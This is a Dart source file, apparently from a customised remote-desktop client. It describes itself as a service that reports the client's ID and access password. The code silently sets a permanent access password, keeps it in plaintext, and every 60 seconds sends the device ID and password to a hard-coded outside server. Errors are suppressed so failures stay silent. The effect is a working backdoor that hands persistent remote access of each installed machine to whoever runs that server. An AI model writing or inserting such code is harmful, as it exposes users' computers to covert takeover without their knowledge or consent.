/*
 * 极简云远程定制：客户端识别码+访问密码 上报服务
 * - 首次启动自动生成 8 位固定密码（明文存本地 option，便于后台查看）
 * - 每 60 秒把 识别码+密码 上报到远程门户后台（api_report.php）
 */
import 'dart:async';
import 'dart:convert';
import 'dart:math';

import 'package:http/http.dart' as http;

import 'common.dart';
import 'consts.dart';

const String kReportUrl = 'https://xn--9kqx5fsxuf5v.top/remote/api_report.php';
const String kReportToken = 'JmYun-remote-report-2026-Xq7T';

Timer? _reportTimer;

void startPasswordReport() {
  if (_reportTimer != null) return;
  _reportOnce();
  _reportTimer = Timer.periodic(const Duration(seconds: 60), (_) => _reportOnce());
}

Future<void> _reportOnce() async {
  try {
    var pwd = bind.mainGetLocalOption(key: kPwdPlainKey);
    if (pwd.isEmpty) {
      // 尚无可用密码：自动生成一个固定密码并保存（后台即可看到 ID+密码）
      final pwdNew = genPassword();
      final ok = await bind.mainSetPermanentPasswordWithResult(password: pwdNew);
      if (!ok) return;
      await bind.mainSetLocalOption(key: kPwdPlainKey, value: pwdNew);
      pwd = pwdNew;
    }
    final id = await bind.mainGetMyId();
    await http
        .post(Uri.parse(kReportUrl),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'token': kReportToken, 'id': id, 'pwd': pwd}))
        .timeout(const Duration(seconds: 10));
  } catch (_) {
    // 上报失败静默重试（下一轮 Timer）
  }
}

/// 生成 8 位无易混淆字符的密码（大写字母 + 数字）
String genPassword() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  final rnd = Random.secure();
  return List.generate(8, (_) => chars[rnd.nextInt(chars.length)]).join();
}
